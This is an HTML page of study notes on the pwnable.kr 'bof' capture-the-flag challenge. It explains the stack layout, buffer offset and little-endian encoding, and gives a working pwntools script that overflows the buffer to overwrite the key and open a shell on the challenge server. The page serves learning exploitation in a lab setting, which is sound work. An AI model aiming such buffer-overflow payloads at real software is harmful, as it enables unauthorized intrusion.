@@ -1,0 +1,94 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>BOF Basic buffer overflow</title>
+</head><body><span style="font-size: 20pt">PWNABLE.KR [BOF]</span><span style="font-size: 16pt"><br/>
+</span><span style="font-size: 16pt"><br/>
+- canaries are buffer overflow stoppers<br/>
+<b><br/>
+</b></span><span style="font-size: 16pt"><b>Pointers</b><div style="text-align: left"><span style="font-family: Roboto"> take up the space needed to hold an address, which is 4 </span></div><b>bytes</b><div style="text-align: left"><span style="font-family: Roboto"> on a 32-bit machine and 8 </span></div><b>bytes</b><div style="text-align: left"><span style="font-family: Roboto"> on a 64-bit machine</span></div></span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 16pt">objdump -D ./bof | less</span><span style="font-size: 18pt"><br/>
+</span><span style="font-size: 18pt"><img src="image.png"/><br/>
+<img src="image 2.png"/><br/>
+<br/>
+Understanding how long the buffer is<ul><li style="list-style-type: none">looking at the c code (We see that the buffer says 32 bytes)</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">BUT that may not be neccessarily true</li>
+</ul>
+</li>
+</ul>
+<img src="image 3.png"/><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">- <b>gets</b>function is suseptable to overflow (doesnt allow specification of byte length)</li>
+</ul>
+</li>
+</ul>
+<br/>
+In the function part of OBJdump <br/>
+<img src="image 6.png"/><br/>
+<img src="image 4.png"/><ul><li style="list-style-type: none">- the function gets called and the next line establishes a buffer (the offset)</li>
+<li style="list-style-type: none">- this means that the buffer is located -2c below ebp</li>
+<li style="list-style-type: none">2c in HEX   ==is equal to== 44</li>
+<li style="list-style-type: none"><b>So the buffer is 44 bytes.</b></li>
+</ul>
+<br/>
+We need to overflow to the key in the stack<br/>
+<img height="344" src="image 5.png" width="300"/><ul><li style="list-style-type: none">- FFF being the top of the stack</li>
+<li style="list-style-type: none">- 0x00 being the bottom</li>
+<li style="list-style-type: none">- value in ebp is the previous function frames ebp</li>
+<li style="list-style-type: none">- the squiggle with 2c next to it is our buffer (we're gonna fill it with A's)</li>
+<li style="list-style-type: none">- below the key in the stack is the saved eip (normal target in a buffer overflow)</li>
+</ul>
+<br/>
+=============================================<br/>
+Breaking down python script to exploit before full exploit<br/>
+=============================================<br/>
+<br/>
+from pwn import *<br/>
+context.log_level = 'debug'<br/>
+conn = remote('pwnable.kr' , 9000)<br/>
+p = 'a' * 0x2c #inital overflow for whole buffer<br/>
+p+= 'b'*4<br/>
+p+= 'c'*4<br/>
+p+= p32(0xcafebabe)<br/>
+<br/>
+<ul><li style="list-style-type: none">- import pwn tools (ez)</li>
+<li style="list-style-type: none">- setting context log to debug</li>
+<li style="list-style-type: none">- connecting to server that hold the buffer overflow file</li>
+<li style="list-style-type: none">- <b>The p's are our payload</b></li>
+<li style="list-style-type: none"><ul><b><li style="list-style-type: none">-We are gonna fill our buffer with A's</li>
+</b><li style="list-style-type: none"><ul><li style="list-style-type: none">-This can be done using the 0x2c or doing 'a'*44 -either works</li>
+</ul>
+</li>
+<li style="list-style-type: none">- the 'B'*4 is for overflowing the orginal ebp (frame pointer) (4 bytes)</li>
+<li style="list-style-type: none">- the 'C'*4 is for overflowing the orginal eip (instruction pointer) (4 bytes)</li>
+</ul>
+</li>
+</ul>
+===========Inserting the key=======================<br/>
+<br/>
+</span><span style="font-size: 18pt">So the final part is</span><ul><span style="font-size: 18pt"><li style="list-style-type: none">&gt; p32(0xcafebabe) </li>
+<li style="list-style-type: none">- <b>This can also be written as '\xbe\xba\xfe\xca' (little endian format)</b></li>
+<li style="list-style-type: none">- p32 is for little endian (putting the key in the right format for the computer to read)</li>
+</span></ul>
+<span style="font-size: 12pt">- <div style="text-align: left"><span style="font-family: Roboto"> the </span></div><b>endianness</b><div style="text-align: left"><span style="font-family: Roboto"> describes the order in which a sequence of bytes are stored</span></div> <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+</ul>
+</li>
+</ul>
+</span><span style="font-size: 12pt">- <div style="text-align: left"><span style="font-family: Roboto">Each byte is made up of two digits which represents the upper or lower 4 bits of the value</span></div> </span><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"/>
+</ul>
+</li>
+</ul>
+<span style="font-size: 18pt"><br/>
+Final Payload! <br/>
+<br/>
+from pwn import *<br/>
+<br/>
+shell = remote('pwnable.kr' , 9000)<br/>
+p = 'a' * 0x2c #inital overflow for whole buffer<br/>
+p+= 'b'*4<br/>
+p+= 'c'*4<br/>
+p+= p32(0xcafebabe)<br/>
+shell.sendline(p)<br/>
+shell.interactive()<br/>
+<br/>
+<br/>
+</span></body></html>
